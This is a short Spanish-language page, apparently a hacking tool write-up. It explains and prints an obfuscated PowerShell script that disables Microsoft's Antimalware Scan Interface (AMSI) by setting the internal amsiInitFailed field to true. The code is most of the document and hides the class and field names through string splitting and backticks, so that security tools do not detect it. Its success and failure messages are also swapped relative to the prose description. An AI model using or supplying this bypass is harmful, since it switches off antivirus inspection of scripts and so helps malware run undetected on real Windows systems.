# Bypass AMSI
El script de PowerShell intenta deshabilitar el Servicio Interfaz de examen antimalware (AMSI) de Microsoft, una característica de seguridad de Windows que permite a las aplicaciones antivirus escanear scripts de PowerShell en busca de comportamientos maliciosos.

Primero, la función **`Is-AMSIDisabled`** verifica si AMSI está deshabilitado, utilizando **`Get-variable`** para obtener una variable específica y comprobando si el campo 'amsi' es verdadero.

Luego, el bloque **`try`** intenta deshabilitar AMSI estableciendo el campo 'amsi' en verdadero. Si tiene éxito, imprime "AMSI Successfully Disabled". Si AMSI ya está deshabilitado, imprime "AMSI". Si hay un error, captura la excepción con catch e imprime "Error Disabling AMSI: $_", donde $_ es la excepción capturada.



```
# Author: Taurus Omar
# Verify if AMSI is disabled
function Is-AMSIDisabled {
    return ((Get-variable (('1Q'+'2U') +'zX'))."A`ss`Embly"."GET`TY`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).GetValue($null) -eq $true
}

# AMSI Bypass
try {
    Set-Item ('Va'+'rI'+'a'+'blE:1'+'q2'+'uZx') ([TYpE]("F"+'rE')) 
    (Get-variable (('1Q'+'2U') +'zX'))."A`ss`Embly"."GET`TY`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE`T`VaLUE)(${n`ULl},${t`RuE})

    if (Is-AMSIDisabled) {
        Write-Output "AMSI"
    } else {
        Write-Output "AMSI Successfully Disabled"
    }
} catch {
    Write-Output "Error Disabling AMSI: $_"
}

```
